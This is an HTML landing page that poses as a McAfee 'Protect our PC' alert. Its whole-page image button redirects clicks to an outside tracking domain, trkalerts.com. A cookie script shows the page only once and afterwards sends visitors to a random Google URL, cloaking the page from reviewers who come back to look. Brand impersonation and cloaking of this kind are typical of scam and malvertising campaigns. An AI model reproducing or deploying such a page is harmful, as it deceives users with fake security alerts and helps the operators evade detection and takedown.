<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>McAfee - Protect our PC</title>
    <style></style>
  </head>
  <body id="lpck">
    <button id="olck" style="background: none; border: 0; width: 100%">
      <img
        style="width: 100%; height: 100%; object-fit: contain"
        src="/images/LP1_2.png"
        alt=""
      />
    </button>
  </body>
  <script>
    function generateRandomCode(length) {
      var chars =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      var code = "";
      for (var i = 0; i < length; i++) {
        var randomIndex = Math.floor(Math.random() * chars.length);
        code += chars[randomIndex];
      }
      return code;
    }

    function handleOutgoingLink() {
      window.location.href = "http://trkalerts.com/";
    }

    var outgoingLinkButton = document.getElementById("olck");
    outgoingLinkButton.addEventListener("click", handleOutgoingLink);

    function checkForCookie() {
      var cookieValue = getCookie("lpck_viewed");
      if (cookieValue === null) {
        // Show the landing page
        document.getElementById("lpck").style.display = "block";
        // Set a cookie to indicate that the landing page has been viewed
        setCookie("lpck_viewed", "true", 365);
      } else {
        // Hide the landing page
        window.location.href =
          "https://www.google.com/" + generateRandomCode(8);
        document.getElementById("lpck").style.display = "none";
      }
    }

    // Helper function to get the value of a cookie
    function getCookie(cookieName) {
      var name = cookieName + "=";
      var decodedCookie = decodeURIComponent(document.cookie);
      var cookieArray = decodedCookie.split(";");
      for (var i = 0; i < cookieArray.length; i++) {
        var cookie = cookieArray[i];
        while (cookie.charAt(0) == " ") {
          cookie = cookie.substring(1);
        }
        if (cookie.indexOf(name) == 0) {
          return cookie.substring(name.length, cookie.length);
        }
      }
      return null;
    }

    // Helper function to set the value of a cookie
    function setCookie(cookieName, cookieValue, expireDays) {
      var d = new Date();
      d.setTime(d.getTime() + expireDays * 24 * 60 * 60 * 1000);
      var expires = "expires=" + d.toUTCString();
      document.cookie =
        cookieName + "=" + cookieValue + ";" + expires + ";path=/";
    }

    // Call the checkForCookie function when the page loads
    window.onload = checkForCookie;
  </script>
</html>
